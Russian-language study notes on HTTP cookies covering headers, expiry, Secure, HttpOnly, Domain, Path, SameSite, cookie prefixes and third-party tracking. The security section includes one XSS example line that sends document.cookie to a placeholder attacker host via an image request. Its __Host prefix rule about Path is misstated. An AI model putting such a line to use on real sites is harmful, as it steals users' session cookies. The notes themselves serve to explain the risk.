Куки используются для управления сеансом, персонализации, трекинга пользователей.
Раньше в куки хранилась пользовательская информация, но это вызывает доп трафик при передаче, поэтому сейчас используется local storage.

Set-Cookie - сервер посылает клиенту
Cookie - клиент серверу
```c
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

Обычный куки - сессионный куки. Как реализована сессия зависит от браузера - может по времени, при закрытии браузера и т.д. 
Есть несессионный куки:  он задается с помощью *Expires* или *Max-age*
```c
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

*Secure* - куки создаются только через https и ssl. При это сам флаг шифрования не добавляет. В поздних версиях chrome и firefox http сайты не могут создавать куки с таким файлом
*HTTPonly* - механизм на стороне клиента, не позволяет через межсайтовый скриптинг получить значения куки через *document.cookie*

*Domain* - задает домен/поддомены. Если указано явно *Domain=mozilla.org*, то берутся все поддомены, если не указан явно, то берутся только домен mozilla.org
(это короче надо, когда куки с другого сайта скачиваются)
*Path* - */docs* на все что лежит по пути /docs/ будут отправляться куки

*Same Site*
Этот заголовок нужен для защиты от неявных пересылок куки
*SameSite=Strict* - пересылается только по ссылкам на данном сайте.
*SameSite=Lax* -  пересылается при навигации с внешнего сайт на этот сайт
*SameSite=None*  -  вообще всегда пересылается, но только при установленном Secure
```c
Set-Cookie: mykey=myvalue; SameSite=Strict
```

Префиксы
#session_fixation
Для защиты от фиксации сессии используются префиксы куки
\_\_Host - куки перешлется только если установлен Secure и если запрос из защищенного источника. Также Domain запрещен, а Path не должен содержать /
\_\_Secure - только Secure и защищенный источник


*Безопасность*
Кража куки часто происходит через социальную инженерию или XSS.  Например злоумышленник с помощью XSS смог заинсертить такой html
```c
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```
Тогда браузер автоматически при загрузке картинки пройдет по этой ссылке


*Трекинг и приватность*

Если домен и схема куки совпадают то это называется *first-party cookies*. Пример - сервер, хостящий страницу устанавливает свои собственные куки

Если не совпадают, то это third-party cookie.  #third_party_cookie_cors
Пример - владелец рекламных баннеров может подгружать куки пользователю. После этого третья сторона по тому, как этот куки используется на различных сайтах может определить интересы пользователей.
